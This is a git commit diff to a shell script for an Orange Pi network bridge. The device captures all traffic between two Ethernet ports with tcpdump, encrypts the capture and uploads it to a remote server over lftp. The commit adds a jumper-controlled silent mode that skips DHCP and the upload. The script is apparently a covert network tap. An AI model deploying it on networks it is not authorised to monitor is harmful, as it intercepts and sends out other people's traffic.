1c1fa99ca6a7204e859a0f6d2766aaae7cb2e432
antnks <antnks@users.noreply.github.com>
2018-12-26 20:59:39 +0200

    Added gpio pin read When jumper is missing it will switch to silent mode: no dhcp request, no upload Moved capture time to config param Split sftp command params

--- bridge-sniff/run.sh
+++ bridge-sniff/run.sh
@@ -7,31 +7,48 @@ USERDIR=/home/user
 GPGID=00112233
 SFTPSRV=remoteserver
 SFTPCREDS=username,password
+CAPTURETIME=300
+GPIOPIN=9
 
 cd $USERDIR
 source config.txt
 
+gpio mode $GPIOPIN in
+
+service network-manager stop
+brctl addbr br0
+brctl addif br0 eth0
+brctl addif br0 enx00606e014ab1
+ifconfig br0 0.0.0.0 up
+
 stamp=`date +%Y%m%d-%H%M%S`
 file=capture-$stamp.pcap
-capturetime=300
 
 # start capture
 echo "default-on" > /sys/class/leds/orangepi\:red\:status/trigger
 echo "default-on" > /sys/class/leds/orangepi\:green\:pwr/trigger
 
 tcpdump -i br0 -s 0 -w $file &
-sleep $capturetime
+sleep $CAPTURETIME
 killall -w tcpdump
 
 # start upload
 echo "heartbeat" > /sys/class/leds/orangepi\:red\:status/trigger
 echo "heartbeat" > /sys/class/leds/orangepi\:green\:pwr/trigger
 
-gzip $file
-gpg --encrypt -r $GPGID $file.gz
-lftp -e "set net:timeout 30; set net:max-retries 1; set ftp:ssl-auth TLS; put $file.gz.gpg; bye" $SFTPSRV -u $SFTPCREDS
-
-sync
+# check input pin for silent mode
+# if jumper is set - bridge will request DHCP and upload
+pinstatus=`gpio read 9`
+if [ "$pinstatus" == 0 ]
+then
+	dhclient br0
+	gzip $file
+	gpg --encrypt -r $GPGID $file.gz
+	timeout="set net:timeout 30"
+	retry="set net:max-retries 1"
+	tls="set ftp:ssl-auth TLS"
+	lftp -e "$timeout; $retry; $tls; put $file.gz.gpg; bye" $SFTPSRV -u $SFTPCREDS
+fi
 
 # idle
 echo "default-on" > /sys/class/leds/orangepi\:green\:pwr/trigger
